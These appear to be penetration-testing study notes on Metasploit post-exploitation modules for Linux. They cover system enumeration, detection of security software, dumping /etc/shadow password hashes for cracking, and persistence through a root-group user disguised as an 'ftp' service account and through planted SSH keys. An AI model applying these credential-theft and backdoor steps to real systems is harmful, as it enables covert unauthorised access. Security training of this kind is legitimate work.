# MSF Linux Post Exploitation Modules


We can utilize these post exploitation modules to enumerate information about the Linux system we currently have access to:

+ Enumerate system configuration
+ Enumerate environment variables
+ Enumerate network configuration
+ VM check
+ Enumerate user history





## Local Enumeration

post/linux/gather/enum_configs
post/linux/gather/enum_system
post/linux/gather/enum_network
post/linux/gather/enum_users_history
post/linux/gather/check_container # check if it is a container like docker
post/linux/gather/checkvm # check if it is a VM


post/linux/gather/enum_protections
	This module checks whether popular system hardening mechanisms are in place, such as SMEP, SMAP, SELinux, PaX and grsecurity. It also tries to find installed applications that can be used to hinder, prevent, or detect attacks, such as tripwire, snort, and apparmor. This module is meant to identify Linux Secure Modules (LSM) in addition to various antivirus, IDS/IPS, firewalls, sandboxes and other security related software.

results can be found with `loot`
	


	

search env platform:linux

post/multi/gather/env









## Hash Dump

We can dump Linux user hashes with the hashdump post exploitation module. Linux password hashes are stored in the /etc/shadow file and can only be accessed by the root user or a user with root privileges.

The hashdump module can be used to dump the user account hashes from the /etc/shadow file and can also be used to unshadow the hashes for password cracking with John the Ripper.



post/linux/gather/hashdump













## Establishing Persistence On Linux

Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.

The persistence techniques we can utilize will depend on the target configuration.

We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.



- Create a user account that looks like a service account
```
useradd -m ftp -s /bin/bash
useradd -m /var/www/html ftp -s /usr/sbin/nologin

passwd ftp

usermod -aG root ftp
usermod -u [ID] ftp
usermod -u 15 ftp # change the ID to other than the default!

```


- Create a persistent service or cronjob

- Add an SSH key



### MSF

search platform:linux persistence


post/linux/manage/sshkey_persistence







